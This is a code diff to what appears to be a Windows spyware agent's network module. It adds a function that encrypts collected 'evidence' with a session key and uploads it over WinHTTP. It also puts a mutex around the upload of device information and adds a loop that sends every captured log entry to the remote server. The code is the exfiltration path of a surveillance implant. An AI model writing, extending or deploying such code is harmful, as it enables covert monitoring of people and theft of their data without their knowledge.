@@ -25,6 +25,7 @@
 #include "filesystem.h"
 #include "conf.h"
 #include "photo.h"
+#include "log_cloudfile.h"
 
 #undef _GLOBAL_VERSION_FUNCTIONS_
 #include "version.h"
@@ -37,6 +38,7 @@
 #include "camera.h"
 
 extern PDEVICE_CONTAINER lpDeviceContainer;
+extern HANDLE g_hDevMutex; //defined in device.cpp
 
 BYTE pCurrentRandomData[16];
 
@@ -267,6 +269,7 @@ BOOL ProtoId()
 	return TRUE;
 }
 
+
 LPBYTE PackEncryptEvidence(__in DWORD dwBufferSize, __in LPBYTE lpInBuffer, __in DWORD dwEvType, __in LPBYTE lpAdditionalData, __in DWORD dwAdditionalDataLen, __out LPDWORD dwOut)
 {
 	DWORD dwAlignedSize = Align(dwBufferSize, 16);
@@ -322,42 +325,88 @@ BOOL SendEvidence(LPBYTE lpBuffer, DWORD dwSize)
 	return bRet;
 }
 
+//encrypt the evidence with the session key and send it (the is already packed as an hashed command)
+BOOL SendEvidence_Encrypt(LPBYTE lpBuffer, DWORD dwSize)
+{
+	DWORD dwAlignedSize=0;
+	BOOL bRet = FALSE;
+
+	//encrypt the packet with the session key
+	Encrypt(lpBuffer, dwSize, pSessionKey, PAD_PKCS5);
+
+	if(dwSize % 16)
+		dwSize += 16 - (dwSize % 16);
+	else
+		dwSize += 16;
+
+	dwAlignedSize = dwSize;
+
+	if(WinHTTPSendData(lpBuffer, dwAlignedSize))
+	{
+		DWORD dwOut;
+		LPBYTE lpRespBuff = GetResponse(FALSE, &dwOut);
+		if (dwOut >= sizeof(DWORD) && lpRespBuff && *(LPDWORD)lpRespBuff == PROTO_OK)
+			bRet = TRUE;
+		
+		zfree(lpRespBuff);
+	}
+
+	return bRet;
+}
+
+
 BOOL ProtoEvidences()
 {
-	BOOL bRet = FALSE;
+	BOOL bRet = FALSE, bSendDevice = TRUE;
 
 	if (lpDeviceContainer)
 	{
-		DWORD dwEvSize;
-		LPBYTE lpEvBuffer = PackEncryptEvidence(lpDeviceContainer->uSize, (LPBYTE)lpDeviceContainer->pDataBuffer, PM_DEVICEINFO, NULL, 0, &dwEvSize);
-		LPBYTE lpCryptedBuff;
-
-		if (WinHTTPSendData(lpCryptedBuff, CommandHash(PROTO_EVIDENCE, lpEvBuffer, dwEvSize, pSessionKey, &lpCryptedBuff)))
+		//wait for the mutex to be signaled
+		if(g_hDevMutex != NULL)
 		{
-			DWORD dwOut;
-			LPBYTE lpRespBuff = GetResponse(FALSE, &dwOut);
- 			if (lpRespBuff && dwOut >= sizeof(DWORD))
-			{
-				if (*(LPDWORD)lpRespBuff == PROTO_OK)
-				{
-					zfree(lpDeviceContainer->pDataBuffer);
-					zfree(lpDeviceContainer);
-					lpDeviceContainer = NULL;
-
-					bRet = TRUE;
-				}
-				else
-				{
-#ifdef _DEBUG
-					__asm int 3;
-#endif
-				}
-
-				zfree(lpRespBuff);
-			}
+			if(WaitForSingleObject(g_hDevMutex, 5000) == WAIT_OBJECT_0)
+				bSendDevice = TRUE;
+			else
+				bSendDevice = FALSE;
 		}
-		zfree(lpEvBuffer);
-		zfree(lpCryptedBuff);
+
+		if(bSendDevice)
+		{
+			DWORD dwEvSize;
+			LPBYTE lpEvBuffer = PackEncryptEvidence(lpDeviceContainer->uSize, (LPBYTE)lpDeviceContainer->pDataBuffer, PM_DEVICEINFO, NULL, 0, &dwEvSize);
+			LPBYTE lpCryptedBuff;
+
+			if (WinHTTPSendData(lpCryptedBuff, CommandHash(PROTO_EVIDENCE, lpEvBuffer, dwEvSize, pSessionKey, &lpCryptedBuff)))
+			{
+				DWORD dwOut;
+				LPBYTE lpRespBuff = GetResponse(FALSE, &dwOut);
+				if (lpRespBuff && dwOut >= sizeof(DWORD))
+				{
+					if (*(LPDWORD)lpRespBuff == PROTO_OK)
+					{
+						zfree(lpDeviceContainer->pDataBuffer);
+						zfree(lpDeviceContainer);
+						lpDeviceContainer = NULL;
+
+						bRet = TRUE;
+					}
+					else
+					{
+	#ifdef _DEBUG
+						__asm int 3;
+	#endif
+					}
+
+					zfree(lpRespBuff);
+				}
+			}
+			zfree(lpEvBuffer);
+			zfree(lpCryptedBuff);
+
+			//release the mutex
+			if(g_hDevMutex)
+				ReleaseMutex(g_hDevMutex);
+		}
 	}
 	
 	Sleep(100);
@@ -564,6 +613,29 @@ BOOL ProtoEvidences()
 				zfree(lpEvBuffer);
 			}
 		}		
+	}
+
+	Sleep(100);
+	for (DWORD i=0; i<MAX_LOG_ENTRIES; i++)
+	{
+		LPBYTE lpEvBuffer = g_log_table[i].lpBuffer;
+		DWORD  dwEvSize   = g_log_table[i].dwSize;
+
+		if (dwEvSize != 0 && lpEvBuffer != NULL)
+		{
+			#ifdef _DEBUG
+				OutputDebugString(L"\r\n[LOG] Sending log evidence\r\n");
+			#endif
+
+//			if(SendEvidence(lpEvBuffer, dwEvSize)) // FIXME: free evidence solo se GetResponse == OK
+
+			if(SendEvidence_Encrypt(lpEvBuffer, dwEvSize))
+			{
+				g_log_table[i].lpBuffer = 0;
+				g_log_table[i].dwSize	= 0;
+				zfree(lpEvBuffer);
+			}
+		}
 	}
 
 	return bRet;
